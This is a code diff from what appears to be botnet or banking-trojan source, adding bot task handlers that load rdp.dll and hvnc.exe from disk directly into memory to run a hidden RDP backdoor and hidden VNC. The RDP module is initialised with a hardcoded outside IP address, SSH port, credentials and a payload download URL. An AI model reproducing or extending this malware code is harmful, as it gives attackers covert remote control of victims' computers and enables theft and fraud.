@@ -871,6 +871,79 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+static DWORD WINAPI ProcessRunRDP(void*)
+{
+	typedef int (WINAPIV* PINIT) (char* config);
+	typedef int (WINAPIV* PSTART)();
+	typedef int (WINAPIV* PSTOP)();
+	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);
+
+	BOT::Initialize();
+	TASKDBG( "Task", "Run RDP" );
+	DWORD c_data;
+	BYTE* data = File::ReadToBufferA( "c:\\rdp.dll", c_data );
+	if( data )
+	{
+		HMEMORYMODULE module = MemoryLoadLibrary(data);
+		if( module )
+		{
+			PINIT Init = (PINIT)MemoryGetProcAddress( module, "Init" );
+			PSTART Start = (PSTART)MemoryGetProcAddress( module, "Start" );
+			PSTOP Stop = (PSTOP)MemoryGetProcAddress( module, "Stop" );
+			PTakeBotGuid TakeBotGuid = (PTakeBotGuid)MemoryGetProcAddress( module, "TakeBotGuid" );
+			if( Init )
+			{
+				TASKDBG( "Task", "Init RDP" );
+				Init("88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73");
+				Start();
+				for(;;) // ждем команды на выключение
+				{
+					HANDLE tmp;
+					tmp = (HANDLE)pOpenMutexA( MUTEX_ALL_ACCESS, false, "DllStop" );
+					if ((DWORD)pWaitForSingleObject( tmp, INFINITE ))
+						pSleep(100);
+					else
+						break;
+				}
+				Stop();
+				TASKDBG( "Task", "Stop RDP" );
+				MemoryFreeLibrary(module);
+			}
+		}
+	}
+	return 0;
+}
+
+bool ExecuteRunRDP(PTaskManager, PCHAR Command, PCHAR Args)
+{
+	MegaJump(ProcessRunRDP);
+	return true;
+}
+
+static DWORD WINAPI ProcessRunHVNC(void*)
+{
+	BOT::Initialize();
+	TASKDBG( "Task", "Run HVNC" );
+	DWORD c_data;
+	BYTE* data = File::ReadToBufferA( "c:\\hvnc.exe", c_data );
+	if( data )
+	{
+		HMEMORYMODULE module = MemoryLoadLibrary(data);
+		if( module )
+		{
+			TASKDBG( "Task", "Exit HVNC" );
+			MemoryFreeLibrary(module);
+		}
+	}
+	return 0;
+}
+
+bool ExecuteRunHVNC(PTaskManager, PCHAR Command, PCHAR Args)
+{
+	MegaJump(ProcessRunHVNC);
+	return true;
+}
+
 bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
 	// Запустить множественную загрузку файлов
